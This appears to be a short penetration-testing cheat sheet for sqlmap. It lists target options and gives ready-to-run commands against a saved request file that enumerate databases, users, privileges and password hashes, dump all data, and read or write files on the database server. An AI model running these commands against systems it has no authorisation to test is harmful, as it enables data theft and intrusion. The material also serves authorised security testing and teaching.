# SQLMap

Target: At least one of these options has to be provided to define the target(s)

```
-u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
-d DIRECT           Connection string for direct database connection
-l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
-m BULKFILE         Scan multiple targets given in a textual file
-r REQUESTFILE      Load HTTP request from a file
-g GOOGLEDORK       Process Google dork results as target URLs
-c CONFIGFILE       Load options from a configuration INI filecode
```

```
sqlmap -r req.txt -p namePeople
```

SQLmap Tutorial Enumeration

```
--current-user      Retrieve DBMS current user
--current-db        Retrieve DBMS current database
--hostname          Retrieve DBMS server hostname
--is-dba            Detect if the DBMS current user is DBA
--users             Enumerate DBMS users
--passwords         Enumerate DBMS users password hashes
--privileges        Enumerate DBMS users privileges
```

Dump Everything

```
sqlmap -r req.txt -p namePeople --all
sqlmap -r req.txt -p namePeople --banner
```

Read All Databases

```
sqlmap -r req.txt -p namePeople --dbs
```

Read Current User

```
sqlmap -r req.txt -p namePeople --current-user
sqlmap -r req.txt -p namePeople --roles
```

Read Hostname

```
sqlmap -r req.txt -p namePeople --hostname
```

Read User Privileges

```
sqlmap -r req.txt -p namePeople --privileges
```

SQLmap File System Access - These options can be used to access the back-end database management system underlying file system

```
 --file-read=FILE..  Read a file from the back-end DBMS file system
 --file-write=FIL..  Write a local file on the back-end DBMS file system
 --file-dest=FILE..  Back-end DBMS absolute filepath to write to
```

Read File From Remote System

{% embed url="https://www.poplabsec.com/complete-sqlmap-tutorial/" %}
